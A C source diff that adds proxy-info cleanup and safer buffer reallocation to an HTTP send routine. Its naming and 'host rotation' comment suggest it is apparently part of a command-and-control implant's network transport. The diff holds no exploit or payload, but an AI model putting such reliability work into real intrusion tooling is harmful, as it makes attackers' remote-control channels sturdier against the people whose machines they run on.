@@ -7,6 +7,31 @@
 
 /*!
  * @brief
+ *  free a previously discovered proxy info structure,
+ *  including the proxy strings behind it
+ */
+VOID HttpProxyInfoFree(
+) {
+    if ( Instance->ProxyForUrl ) {
+        PWINHTTP_PROXY_INFO ProxyInfo = ( PWINHTTP_PROXY_INFO ) Instance->ProxyForUrl;
+
+        if ( ProxyInfo->lpszProxy ) {
+            Instance->Win32.GlobalFree( ProxyInfo->lpszProxy );
+            ProxyInfo->lpszProxy = NULL;
+        }
+
+        if ( ProxyInfo->lpszProxyBypass ) {
+            Instance->Win32.GlobalFree( ProxyInfo->lpszProxyBypass );
+            ProxyInfo->lpszProxyBypass = NULL;
+        }
+
+        Instance->Win32.LocalFree( Instance->ProxyForUrl );
+        Instance->ProxyForUrl = NULL;
+    }
+}
+
+/*!
+ * @brief
  *  send a http request
  *
  * @param Send
@@ -189,6 +214,10 @@ BOOL HttpSend(
                 PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
             }
 
+            /* a previously discovered proxy (e.g. after host rotation) must
+             * be freed before it gets replaced */
+            HttpProxyInfoFree();
+
             Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
             Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
             MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
@@ -202,6 +231,8 @@ BOOL HttpSend(
                     ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;
 
                     PRINTF_DONT_SEND( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );
+
+                    HttpProxyInfoFree();
 
                     Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                     Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
@@ -222,6 +253,8 @@ BOOL HttpSend(
                         if ( ProxyInfo.lpszProxy ) {
                             PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
                         }
+
+                        HttpProxyInfoFree();
 
                         Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                         Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
@@ -268,7 +301,16 @@ BOOL HttpSend(
                     if ( ! RespBuffer ) {
                         RespBuffer = Instance->Win32.LocalAlloc( LPTR, BufRead );
                     } else {
-                        RespBuffer = Instance->Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );
+                        /* realloc into a temp: on failure the old buffer pointer must survive */
+                        LPVOID ReAlloced = Instance->Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );
+                        if ( ! ReAlloced ) {
+                            PUTS_DONT_SEND( "Failed to allocate response buffer" )
+                            Instance->Win32.LocalFree( RespBuffer );
+                            RespBuffer = NULL;
+                            Successful = FALSE;
+                            goto LEAVE;
+                        }
+                        RespBuffer = ReAlloced;
                     }
 
                     if ( ! RespBuffer ) {
@@ -283,10 +325,16 @@ BOOL HttpSend(
                     MemSet( Buffer, 0, sizeof( Buffer ) );
                 } while ( Successful == TRUE );
 
-                Resp->Length = RespSize;
-                Resp->Buffer = RespBuffer;
-
-                Successful = TRUE;
+                if ( Successful ) {
+                    Resp->Length = RespSize;
+                    Resp->Buffer = RespBuffer;
+                } else if ( RespBuffer ) {
+                    /* a partially read body must not be treated as a full
+                     * response: drop it and let the caller retry */
+                    PUTS_DONT_SEND( "Failed to read the full response body" )
+                    Instance->Win32.LocalFree( RespBuffer );
+                    RespBuffer = NULL;
+                }
             }
         }
     } else {
